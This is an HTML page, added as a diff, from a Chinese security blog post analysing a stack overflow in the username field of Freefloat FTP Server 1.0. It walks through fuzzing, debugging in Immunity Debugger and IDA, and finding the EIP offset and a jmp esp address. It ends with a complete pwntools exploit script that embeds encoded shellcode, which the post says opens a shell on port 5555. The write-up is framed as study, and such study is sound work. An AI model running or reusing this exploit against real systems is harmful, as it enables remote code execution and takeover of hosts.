@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="很久没有动笔写文章了。发现打完某场比赛后，整个人都消磨了下来，没有前面的干劲十足样子了。加上临近毕业，内心也浮躁了许多。借着前言，总结一下这两个月来的东西。第一点是路子，很想以后走漏洞挖掘的路子，可是前面一年都是在搞web安全加上还剩下几个月时间就实习了，并且听说漏洞挖掘挺难找工作的，很纠结。目前想这几个月好好积累二进制基础、积累一下CTF的pwn类型，复现多几个漏洞，然后够money的话再考个P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Freefloat FTP Server1.0溢出漏洞分析">
+<meta property="og:url" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="很久没有动笔写文章了。发现打完某场比赛后，整个人都消磨了下来，没有前面的干劲十足样子了。加上临近毕业，内心也浮躁了许多。借着前言，总结一下这两个月来的东西。第一点是路子，很想以后走漏洞挖掘的路子，可是前面一年都是在搞web安全加上还剩下几个月时间就实习了，并且听说漏洞挖掘挺难找工作的，很纠结。目前想这几个月好好积累二进制基础、积累一下CTF的pwn类型，复现多几个漏洞，然后够money的话再考个P">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/18.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/19.png">
+<meta property="og:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20.png">
+<meta property="article:published_time" content="2019-07-17T12:14:03.000Z">
+<meta property="article:modified_time" content="2019-07-18T04:45:29.675Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Freefloat FTP Server1.0溢出漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/linux%E7%9A%84plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Freefloat FTP Server1.0溢出漏洞分析&body=Check out this article: https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Freefloat FTP Server1.0溢出漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Freefloat FTP Server1.0溢出漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">正常测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%94%A8%E6%88%B7%E5%90%8D%E8%BE%93%E5%85%A5%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">测试用户名输入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%94%A8%E6%88%B7%E5%90%8D%E8%BE%93%E5%85%A5%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">调试用户名输入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%BA%A2%E5%87%BA%E7%A9%BA%E9%97%B4"><span class="toc-number">6.</span> <span class="toc-text">确定溢出空间</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2payload"><span class="toc-number">7.</span> <span class="toc-text">部署payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hack-it"><span class="toc-number">8.</span> <span class="toc-text">hack it</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Freefloat FTP Server1.0溢出漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-17T12:14:03.000Z" itemprop="datePublished">2019-07-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>很久没有动笔写文章了。发现打完某场比赛后，整个人都消磨了下来，没有前面的干劲十足样子了。<br>加上临近毕业，内心也浮躁了许多。借着前言，总结一下这两个月来的东西。<br>第一点是路子，很想以后走漏洞挖掘的路子，可是前面一年都是在搞web安全加上还剩下几个月时间就实习了，并且听说漏洞挖掘挺难找工作的，很纠结。目前想这几个月好好积累二进制基础、积累一下CTF的pwn类型，复现多几个漏洞，然后够money的话再考个PTE(听老师说挺简单的，找工作会容易点)。<br>第二就是，突然发现我开发挺菜的，或者说根本就没有code的经历，看着队友经常写项目，挺好的。安全是在建立的基础上，如果没有开发的经历，可能以后我的路子会越来越难提升。无论是漏洞挖掘上的C语言开发，还是web安全上的各种开发还有python。<br>第三点就是和前面差不多，在和队友去听某个公司的RHCE培训过程中，发现Linux运维也挺好的，还有一句话，安全是在搭建之上的，端口对应服务，服务存在漏洞，如果连服务都不会搭建，怎么搞安全?所以给自己立了个flag,这段时间看完《Linux基础及应用教程（基于CentOS7 第2版）》和《CentOS7系统管理与运维实战》两本书。还有RHCE课程，如果能拿下RHCE那更好了。<br>不过主要精力还是在于漏洞挖掘方向上。<br>Freefloat FTP Server1.0溢出漏洞分析是我在《kali linux 网络渗透测试实践指南》这本书上发现的一个挺基础又深刻的案例，下面是详细的分析过程。</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1、freefloatftpserver1.0<br>2、ImmunityDebugger<br>3、kali(pwntools)<br>4、xp-sp3<br><a target="_blank" rel="noopener" href="https://github.com/RJ45mp/material/blob/master/Freefloat%20FTP%20Server1.0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B4%A0%E6%9D%90.7z">样本软件和工具</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在xp-sp3上安装freefloatftpserver1.0和ImmunityDebugger</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png"></p>
+<h1 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h1><p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png"></p>
+<p>这是正常测试的情况，一切输入都可能存在安全隐患。可以看到这里存在三类输入点：<br>1是用户名输入点，2是密码输入点，3是命令输入点。</p>
+<h1 id="测试用户名输入点"><a href="#测试用户名输入点" class="headerlink" title="测试用户名输入点"></a>测试用户名输入点</h1><p>1、利用ImmunityDebugger，将freefloatftpserver1.0的进程附加进来调试(需要重新运行,前面已经连接了一次)</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png"></p>
+<p>2、在kali中利用pwntools编写测试脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;192.168.0.100&#x27;,21)</span><br><span class="line">payload = &#x27;A&#x27;*500</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>3、发送测试<br><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png"><br><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png"></p>
+<p>EIP发生了改变，EIP&#x3D;41414141。这里明显存在栈溢出，覆盖了原EIP。</p>
+<h1 id="调试用户名输入点"><a href="#调试用户名输入点" class="headerlink" title="调试用户名输入点"></a>调试用户名输入点</h1><p>1、寻找位置下断点</p>
+<p>在输入用户名前，该ftp会打印出FreeFloat Ftp Server(Vsersion 1.00)的字符串。<br>故以此为特征，断点在这个位置</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png"></p>
+<p>2、确定异常位置</p>
+<p>再次利用脚本发送数据到ftp，然后一步步步过，直到发生异常</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png"></p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png"></p>
+<p>确定漏洞位置为402DE0函数处，到达这里后会发生异常退出情况。</p>
+<p>3、IDA分析漏洞位置</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png"></p>
+<p>经分析，是strcpy函数导致的栈溢出漏洞。跟进asc_40A588证实为用户名输入点。</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png"></p>
+<h1 id="确定溢出空间"><a href="#确定溢出空间" class="headerlink" title="确定溢出空间"></a>确定溢出空间</h1><p>1、生成垃圾数据，发送到ftp</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png"></p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png"></p>
+<p>确定覆盖的eip为34694133。esp位置为00BDFC2C，内含数据7Ai8。</p>
+<p>2、计算溢出空间</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png"></p>
+<p>溢出空间为251,到达esp位置后的空间为263，也就是说，从eip到esp一共有12个字节空间。</p>
+<p>3、证实栈帧位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;192.168.0.100&#x27;,21)</span><br><span class="line">payload = &#x27;A&#x27;*251</span><br><span class="line">eip = &#x27;B&#x27;*4</span><br><span class="line">eip2esp=&#x27;C&#x27;*8</span><br><span class="line">esp = &#x27;D&#x27;*4</span><br><span class="line">payload = payload+eip+eip2esp+esp</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png"></p>
+<p>4、寻找jmp esp地址</p>
+<p>通过可执行模块的USER32.dll，查找jmp esp地址</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png"></p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png"></p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png"></p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/18.png"></p>
+<p>采用jmp esp &#x3D; 77D29353。（jmp esp技术原理见基础区文章）</p>
+<h1 id="部署payload"><a href="#部署payload" class="headerlink" title="部署payload"></a>部署payload</h1><p>1、生成shellcode</p>
+<p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/19.png"><br>shellcode功能为向hacker打开一个5555端口的shell，其中去除了\x00\x0a\x0d的坏字符。</p>
+<p>2、部署payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;192.168.0.100&quot;,21)</span><br><span class="line">payload = &#x27;A&#x27;*251</span><br><span class="line">payload +=p32(0x77d29353)</span><br><span class="line">payload +=&#x27;C&#x27;*8</span><br><span class="line">payload +=&#x27;\x90&#x27;*20</span><br><span class="line">shellcode = (&quot;\xbe\xc6\x74\x17\xa4\xdb\xd7\xd9\x74\x24\xf4\x58\x2b\xc9\xb1&quot;</span><br><span class="line">&quot;\x53\x31\x70\x12\x83\xe8\xfc\x03\xb6\x7a\xf5\x51\xca\x6b\x7b&quot;</span><br><span class="line">&quot;\x99\x32\x6c\x1c\x13\xd7\x5d\x1c\x47\x9c\xce\xac\x03\xf0\xe2&quot;</span><br><span class="line">&quot;\x47\x41\xe0\x71\x25\x4e\x07\x31\x80\xa8\x26\xc2\xb9\x89\x29&quot;</span><br><span class="line">&quot;\x40\xc0\xdd\x89\x79\x0b\x10\xc8\xbe\x76\xd9\x98\x17\xfc\x4c&quot;</span><br><span class="line">&quot;\x0c\x13\x48\x4d\xa7\x6f\x5c\xd5\x54\x27\x5f\xf4\xcb\x33\x06&quot;</span><br><span class="line">&quot;\xd6\xea\x90\x32\x5f\xf4\xf5\x7f\x29\x8f\xce\xf4\xa8\x59\x1f&quot;</span><br><span class="line">&quot;\xf4\x07\xa4\xaf\x07\x59\xe1\x08\xf8\x2c\x1b\x6b\x85\x36\xd8&quot;</span><br><span class="line">&quot;\x11\x51\xb2\xfa\xb2\x12\x64\x26\x42\xf6\xf3\xad\x48\xb3\x70&quot;</span><br><span class="line">&quot;\xe9\x4c\x42\x54\x82\x69\xcf\x5b\x44\xf8\x8b\x7f\x40\xa0\x48&quot;</span><br><span class="line">&quot;\xe1\xd1\x0c\x3e\x1e\x01\xef\x9f\xba\x4a\x02\xcb\xb6\x11\x4b&quot;</span><br><span class="line">&quot;\x38\xfb\xa9\x8b\x56\x8c\xda\xb9\xf9\x26\x74\xf2\x72\xe1\x83&quot;</span><br><span class="line">&quot;\xf5\xa8\x55\x1b\x08\x53\xa6\x32\xcf\x07\xf6\x2c\xe6\x27\x9d&quot;</span><br><span class="line">&quot;\xac\x07\xf2\x08\xa4\xae\xad\x2e\x49\x10\x1e\xef\xe1\xf9\x74&quot;</span><br><span class="line">&quot;\xe0\xde\x1a\x77\x2a\x77\xb2\x8a\xd5\x62\xf0\x02\x33\xe6\xe6&quot;</span><br><span class="line">&quot;\x42\xeb\x9e\xc4\xb0\x24\x39\x36\x93\x1c\xad\x7f\xf5\x9b\xd2&quot;</span><br><span class="line">&quot;\x7f\xd3\x8b\x44\xf4\x30\x08\x75\x0b\x1d\x38\xe2\x9c\xeb\xa9&quot;</span><br><span class="line">&quot;\x41\x3c\xeb\xe3\x31\xdd\x7e\x68\xc1\xa8\x62\x27\x96\xfd\x55&quot;</span><br><span class="line">&quot;\x3e\x72\x10\xcf\xe8\x60\xe9\x89\xd3\x20\x36\x6a\xdd\xa9\xbb&quot;</span><br><span class="line">&quot;\xd6\xf9\xb9\x05\xd6\x45\xed\xd9\x81\x13\x5b\x9c\x7b\xd2\x35&quot;</span><br><span class="line">&quot;\x76\xd7\xbc\xd1\x0f\x1b\x7f\xa7\x0f\x76\x09\x47\xa1\x2f\x4c&quot;</span><br><span class="line">&quot;\x78\x0e\xb8\x58\x01\x72\x58\xa6\xd8\x36\x68\xed\x40\x1e\xe1&quot;</span><br><span class="line">&quot;\xa8\x11\x22\x6c\x4b\xcc\x61\x89\xc8\xe4\x19\x6e\xd0\x8d\x1c&quot;</span><br><span class="line">&quot;\x2a\x56\x7e\x6d\x23\x33\x80\xc2\x44\x16&quot;)</span><br><span class="line">payload +=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p>\x90为nop指令，起着类似滑板的作用。</p>
+<h1 id="hack-it"><a href="#hack-it" class="headerlink" title="hack it"></a>hack it</h1><p><img src="/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20.png"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-557521-1-1.html">https://www.52pojie.cn/thread-557521-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=i6Br57lh4uE">https://www.youtube.com/watch?v=i6Br57lh4uE</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
